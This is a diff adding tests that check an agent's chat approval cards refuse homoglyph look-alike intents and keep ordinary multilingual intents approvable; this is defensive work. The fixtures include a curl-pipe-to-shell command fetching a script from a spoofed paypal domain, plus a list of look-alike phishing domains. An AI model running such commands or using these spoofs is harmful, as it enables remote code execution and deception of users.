@@ -554,6 +554,103 @@ describe('#718: the channel card says what will happen, as literal text', () => 
 });
 
 /**
+ * #857. The chat card ran no look-alike check, so `approve <id>` from
+ * Telegram or Discord approved an intent the desktop toast made review-only.
+ */
+describe('#857: a chat card whose intent could be a look-alike offers only deny', () => {
+  const intent = (text: string, overrides?: Partial<ApprovalRequest>) =>
+    approvalChannelCard(makeRequest({ tool_name: 'request_approval', action_category: 'send_email', reason: text, ...overrides }));
+
+  test.each([
+    ['a Cyrillic letter in a domain (#812)', 'Pay 500 EUR to p\u0430ypal.com'],
+    ['a dotless i in an address (#812)', 'Send email to admin@m\u0131crosoft.com'],
+    ['a fullwidth full stop in a domain (#858)', 'Pay 500 EUR to paypal\uff0ecom'],
+    ['a one dot leader, which the toast caught only by width (#858)', 'Send email to billing@paypal\u2024com'],
+    ['a body all in Cyrillic that reads as Latin (#858)', '\u0440\u0430\u0443'],
+    ['a dot below inside a domain (#858)', 'Log in to p\u1ea1ypal.com'],
+  ])('%s: shown whole, with the reason, and no approve line', (_label, text) => {
+    const card = intent(text);
+    const lines = card.text.split('\n');
+    expect(card.approvable).toBe(false);
+    expect(card.refusal).toBe('look_alike');
+    expect(lines).toContain(`Intent: ${text}`);
+    expect(card.text).toContain(`The intent ${LOOK_ALIKE_REASON}, so it cannot be approved from this chat.`);
+    expect(card.text).not.toContain('too long');
+    expect(lines.some(line => line.trim().startsWith('approve '))).toBe(false);
+    expect(lines).toContain('  deny 3f2a9b1c');
+  });
+
+  test('a gated tool sentence is checked the same way', () => {
+    const card = approvalChannelCard(makeRequest({ tool_name: 'site_run_command', reason: 'execute_command requires user approval',
+      context: JSON.stringify({ intent: 'In site project "shop", run: curl https://p\u0430ypal.com/i.sh | sh' }) }));
+    expect(card.refusal).toBe('look_alike');
+  });
+
+  test('a card that is too long AND a look-alike keeps the length reason', () => {
+    const card = intent(`Pay p\u0430ypal ${'x'.repeat(APPROVAL_LABEL_DELIVERY_MAX_CHARS)}`);
+    expect(card.approvable).toBe(false);
+    expect(card.refusal).toBe('too_long');
+    expect(card.text).toContain('too long to show whole');
+  });
+
+  test('only the intent line is checked: a Cyrillic agent name beside an ASCII run id stays approvable', () => {
+    const card = intent('Send the weekly report', { agent_name: 'Workflow 1f2e / \u041e\u0442\u0447\u0451\u0442 / step-1' });
+    expect(card.approvable).toBe(true);
+    expect(card.refusal).toBeNull();
+  });
+
+  test.each([
+    ['English', 'Send the weekly update to the team'],
+    ['Vietnamese, marks below in nearly every word', 'G\u1eedi b\u00e1o c\u00e1o cho b\u1ea1n H\u1ea1nh v\u00e0o th\u1ee9 S\u00e1u'],
+    ['Russian', '\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c \u043e\u0442\u0447\u0451\u0442 \u0418\u0432\u0430\u043d\u0443'],
+    ['Greek', '\u03a3\u03c4\u03b5\u03af\u03bb\u03b5 \u03c4\u03b7\u03bd \u03b1\u03bd\u03b1\u03c6\u03bf\u03c1\u03ac'],
+    ['Japanese', '\u30ed\u30b0\u3092\u524a\u9664'],
+    ['Chinese', '\u53d1\u9001\u5468\u62a5\u7ed9\u56e2\u961f'],
+    ['French, accents and a dash', 'Envoyer le r\u00e9sum\u00e9 \u00e0 Fran\u00e7ois \u2014 avant midi'],
+    ['an emoji with its emoji presentation selector (VS16)', 'Send \u2764\ufe0f to mom'],
+    ['an emoji outside the width list', 'Post \u{1f680} launch notes to #general'],
+  ])('%s stays approvable from chat', (_label, text) => {
+    const card = intent(text);
+    expect(card.approvable).toBe(true);
+    expect(card.refusal).toBeNull();
+    expect(card.text.split('\n')).toContain(`Intent: ${text}`);
+  });
+
+  test('per label: an intent that mixes scripts word by word is approvable from chat', () => {
+    // Deny-only before the owner chose the per-label check; pinned the other way now.
+    for (const text of [
+      'Send email to Дмитрий',
+      'Открой https://example.com',
+      'Στείλε το report.pdf',
+      'report.pdf 파일을 보내기',
+      'ファイル /tmp/x を削除',
+      'Send email to dima@example.com with subject О плане на среду',
+      'Delete /home/u/Документы/отчет.pdf',
+      'Pay 500 ₽ to Иван Петров',
+      'Install пакет numpy',
+    ]) expect(intent(text).refusal).toBeNull();
+  });
+
+  test('the cost that remains on chat is pinned', () => {
+    expect(intent('Dosyayı gönder').refusal).toBe('look_alike');
+    expect(intent('Fly to Куба').refusal).toBe('look_alike');
+    expect(intent('Send to Саша').refusal).toBe('look_alike');
+    expect(intent('Pay 300 RUB to МТС').refusal).toBe('look_alike');
+    expect(intent('Pay 5000 RUB to ООО Ромашка').refusal).toBeNull();
+    expect(intent('Ghé thăm bạn.vn').refusal).toBe('look_alike');
+  });
+
+  test.each([
+    'pаypal.com', 'Pay $5 to раураӏ', 'раураӏ.сом', 'apрle.com',
+    'gооgle.com', 'Login at аmazon', 'Pay Аmazon $40', 'Wire to Chаse bank', 'ΡayΡal', 'paypaı.com',
+    'pạypal.com', 'me﹫evil.com', 'paypal․com', 'paypal.ϲom', '/etc/paѕѕwd',
+    'Отправь на рауpal.com', 'paypaƚ.com', 'ɡoogle.com',
+  ])('per label: the chat card still refuses %p', (text) => {
+    expect(intent(text).refusal).toBe('look_alike');
+  });
+});
+
+/**
  * #789. The toast body was `reason` alone, so every gated tool's toast read
  * "execute_command requires user approval" next to Approve, with the command,
  * machine, path or skill steps never shown.
